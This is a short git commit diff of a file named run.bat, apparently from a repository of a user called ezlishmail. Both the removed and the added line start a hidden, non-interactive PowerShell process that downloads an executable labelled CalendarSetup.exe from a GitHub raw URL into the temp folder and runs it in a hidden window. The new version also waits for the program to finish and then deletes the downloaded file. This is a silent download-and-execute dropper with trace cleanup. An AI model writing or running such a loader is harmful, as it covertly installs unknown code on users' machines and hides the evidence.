3dddf2c01ecacab848682e14ba3a220c6d394285
ezlishmail <140186829+ezlishmail@users.noreply.github.com>
2026-05-06 06:09:02 +0530

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,3 +1,3 @@
 @echo off
-start "" /B powershell -NoP -NonI -W Hidden -C "$b='%TEMP%\cs.exe';irm https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/CalendarSetup.exe -OutFile $b;Start-Process $b -WindowStyle Hidden"
+start "" /B powershell -NoP -NonI -W Hidden -C "$b='%TEMP%\cs.exe';irm https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/CalendarSetup.exe -OutFile $b;Start-Process $b -WindowStyle Hidden -Wait;del $b 2>$null"
 exit
